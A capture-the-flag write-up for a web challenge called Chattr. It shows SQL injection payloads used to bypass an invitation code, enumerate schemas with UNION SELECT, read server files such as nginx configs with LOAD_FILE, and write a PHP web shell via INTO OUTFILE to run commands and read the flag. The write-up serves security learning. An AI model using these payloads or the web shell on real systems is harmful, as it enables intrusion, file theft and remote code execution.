## Overview

Chattr is a web challenge featuring a chat application with a registration/login system. The goal is to exploit SQL injection vulnerabilities to:

1. Register without a valid invitation code
2. Dump user credentials (Flag 1)
3. Leak the web root path via `LOAD_FILE` (Flag 2)
4. Upload a PHP web shell and read `flag.txt` (Flag 3)

---

## Recon — Login & Registration

The app has a standard login and registration form.

![Login form](/assets/img/posts/sqli/01-login-form.png)

I started with classic SQLi payloads on the login form : `admin' OR 1=1-- -`, but the application returned `a wrong username or password` message. I then investigated whether the input validation was implemented only on the client side or also enforced server side. After testing, I confirmed that validation existed on both sides, indicating that the login form was not vulnerable to SQL injection.After that I went to test the registration form. 

![Login error](/assets/img/posts/sqli/02-login-error.png)

## Bypassing the Invitation Code (SQLi #1)

Registration requires an invitation code in the format `aaaa-aaaa-1234`. The frontend rejected anything outside this format.
Since I did not have a valid invitation code immmm! , as you expect now I started testing the invitation code field.

Injecting directly in the browser:

```
aaaa-aaaa-1234' OR 1=1-- -
```

Returned an *invalid format* error — client-side validation.

![Frontend validation error](/assets/img/posts/sqli/03-invite-frontend-error.png)

There is a validation in the client-side but what about the server-side?? I send it again using *Burpsuite*.

![Burp intercept](/assets/img/posts/sqli/04-burp-invite.png)

The server returned **500 Internal Server Error** — a strong indicator of a backend SQLi.Now I need to write the correct syntax to execute the query.It likely uses parentheses around the input, so I adjusted the payload:

```
aaaa-aaaa-1234') OR 1=1-- -
```

Result: **200 OK — account created successfully.** ✅

![Account created](/assets/img/posts/sqli/05-account-created.png)

## SQL Injection in Message Search (SQLi #2)

Searching for a non existent message returned an empty result message.

![Empty search](/assets/img/posts/sqli/08-empty-search.png)

Then I tried searching for `' OR 1=1-- -`. The page returned no content, and it looks like an error occurred silently.

![Search error](/assets/img/posts/sqli/09-search-error.png)

Burp confirmed a **500 Internal Server Error**, same pattern as before parentheses wrapping the input.

![Burp search 500](/assets/img/posts/sqli/10-burp-500.png)

Adjusting to:

```
') OR 1=1-- -
```

Returned **all messages** in the database. Injection confirmed. ✅

![All messages returned](/assets/img/posts/sqli/11-all-messages.png)

## Enumeration via UNION SELECT

```sql
') UNION SELECT 1,2,schema_name,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
```

- `chattr` ← target

## Reading Server Files — Flag 2 

### Attempt 1 — Default Web Root

```sql
') UNION SELECT 1,2,LOAD_FILE("/var/www/html/index.php"),4-- -
```

No output the app isn't hosted there.

![No output](/assets/img/posts/sqli/16-loadfile-empty.png)

### Reading nginx Config

```sql
') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/nginx.conf"),4-- -
```

![nginx.conf](/assets/img/posts/sqli/17-nginx-conf.png)

This pointed to `/etc/nginx/sites-enabled/default` (the enabled site config for Debian-based systems).

```sql
') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -
```

![Web root revealed](/assets/img/posts/sqli/18-webroot.png)

Web root path discovered **Flag 2 Done.✅**

---

## RCE via INTO OUTFILE — Flag 3 

With the real web root known (`/var/www/......./`), I wrote a PHP web shell directly to disk:

```sql
') UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/var/www/......./shell.php'-- -
```

![Shell uploaded](/assets/img/posts/sqli/19-shell-upload.png)

Shell created successfully. I then browsed to the shell and ran commands:

```
cd ../..;ls
cd ../../..;ls
```

Found `flag.txt` at the root path.

![Directory listing](/assets/img/posts/sqli/20-ls-root.png)

```
cat /flag_876a4c.txt
or
cd ../../..;cat flag_876a4c.txt
```

![Flag 3](/assets/img/posts/sqli/21-flag3.png)

**Flag 3 Done✅ — challenge completed.**

## Summary

| Step | Technique | Result |
|------|-----------|--------|
| Registration bypass | SQLi in invitation code (`') OR 1=1-- -`) | Account created |
| Credential dump | UNION-based SQLi in search | Admin password (Flag 1) |
| Path disclosure | `LOAD_FILE` on nginx config | Web root (Flag 2) |
| RCE | `INTO OUTFILE` → PHP shell | `flag.txt` (Flag 3) |
